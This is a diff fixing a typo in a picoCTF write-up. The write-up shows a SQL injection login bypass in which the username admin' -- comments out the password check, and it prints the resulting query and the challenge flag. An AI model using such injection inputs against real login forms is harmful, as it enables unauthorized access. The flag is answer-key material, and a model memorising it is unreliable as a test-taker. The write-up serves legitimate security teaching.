@@ -29,8 +29,8 @@ SELECT * FROM users WHERE name='admin' --' AND password='something random'
 Testing this gives the flag.
 <pre>
 username: admin' --
-password: ssomething random
-SQL query: SELECT * FROM users WHERE name='admin' --' AND password='ssomething random'
+password: something random
+SQL query: SELECT * FROM users WHERE name='admin' --' AND password='something random'
 <h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_83dad972}</p>
 </pre>
 > ``picoCTF{m0R3_SQL_plz_83dad972}``
